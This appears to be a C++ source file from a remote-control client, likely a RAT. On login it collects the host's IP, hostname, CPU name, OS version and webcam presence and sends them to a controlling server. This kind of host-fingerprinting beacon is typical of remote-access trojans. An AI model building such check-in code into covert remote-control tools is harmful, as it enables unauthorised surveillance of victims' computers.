#include "stdafx.h"
#include "Login.h"
#include "Common.h"
#include <tchar.h>

INT      SendLoginInfo(CIOCPClient* IOCPClient, DWORD WebSpeed)
{
	NTSTATUS Status = STATUS_SUCCESS;
	LOGIN_INFO li;
	ZeroMemory(&li, sizeof(li));

	li.IsToken = CLIENT_LOGIN;
	sockaddr_in ClientAddrData;
	memset(&ClientAddrData, 0, sizeof(sockaddr_in));
	int ClientAddrLength = sizeof(sockaddr_in);
	getsockname(IOCPClient->_M_sClient, (sockaddr*)&ClientAddrData, &ClientAddrLength);


	li.ClientAddrData = ClientAddrData.sin_addr;
	gethostname(li.HostNameData, MAX_PATH);

	ULONG ProcessNameStringLength = MAX_PATH;
	Status = ProcessorNameString(li.ProcessorNameStringData, &ProcessNameStringLength);

	li.IsWebCameraExist = IsWebCamera();

	li.OsVersionInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

	GetVersionEx((OSVERSIONINFO*)&li.OsVersionInfoEx);

	int len = 0;
	len = IOCPClient->OnServerSending((char*)&li, sizeof(LOGIN_INFO));
	
	return len;
}

NTSTATUS ProcessorNameString(LPTSTR ProcessorNameString, ULONG* ProcessorNameStringLength)
 {
	HKEY     hKey   = NULL;
	DWORD    Type   = REG_SZ;
	NTSTATUS Status = STATUS_SUCCESS;

	Status = RegOpenKey(
					HKEY_LOCAL_MACHINE, 
					_T("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), 
					&hKey
				);

	if (Status != STATUS_SUCCESS) {
		return Status;
	}

	Status = RegQueryValueEx(
					hKey, 
					_T("ProcessorNameString"), 
					NULL, 
					&Type, 
					(LPBYTE)ProcessorNameString, 
					ProcessorNameStringLength
				);

	RegCloseKey(hKey);
	hKey = NULL;

	return Status;
}

BOOL     IsWebCamera()
{
	BOOL  IsOk = FALSE;
	TCHAR DriverName[MAX_PATH];
	
	// ±È¿˙…Ë±∏
	for (int i = 0; i < 10 && !IsOk; i++) 
	{
		IsOk = capGetDriverDescription(i, DriverName, sizeof(DriverName), NULL, 0);
	}
	return IsOk;
}


